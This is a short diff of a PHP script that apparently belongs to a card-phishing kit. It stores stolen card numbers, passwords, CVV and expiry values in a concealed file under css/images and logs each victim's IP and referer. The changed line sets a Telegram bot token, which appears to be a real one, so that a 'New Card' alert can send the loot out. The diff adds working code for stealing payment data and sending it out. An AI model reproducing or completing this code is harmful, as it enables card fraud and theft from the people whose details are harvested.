@@ -45,7 +45,7 @@ $protocol = $_SERVER['SERVER_PROTOCOL'];
     $ref = $_SERVER['HTTP_REFERER'];
     $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
     file_put_contents("css/images/i.txt","$cards$cardss$cardsss$cardssss:$pass:$cvv:$sal:$mah");
-    $token = "token"; 918667949:AAG9smnBILEVyRGS207B8vAAcsvTaW958uo//
+    $token = "918667949:AAG9smnBILEVyRGS207B8vAAcsvTaW958uo"; //YourBotToken
      $textmsg = "
 🔆 New Card 🔆
 ➖➖➖➖➖➖➖
